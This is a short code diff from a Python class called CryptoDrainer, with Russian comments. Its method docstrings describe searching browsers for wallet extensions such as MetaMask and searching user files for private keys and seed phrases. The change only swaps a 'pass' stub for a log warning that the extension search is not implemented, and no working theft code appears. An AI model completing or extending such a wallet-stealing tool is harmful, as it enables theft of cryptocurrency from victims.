@@ -245,7 +245,7 @@ class CryptoDrainer:
     def _search_browser_extensions(self) -> None:
         """Ищет криптовалютные расширения браузеров"""
         # Здесь будет код для поиска расширений MetaMask и др.
-        pass
+        self.logger.warning("Поиск расширений браузера (_search_browser_extensions) пока не реализован.")
     
     def _search_for_keys_in_files(self) -> None:
         """Ищет ключи и сид-фразы в пользовательских файлах"""
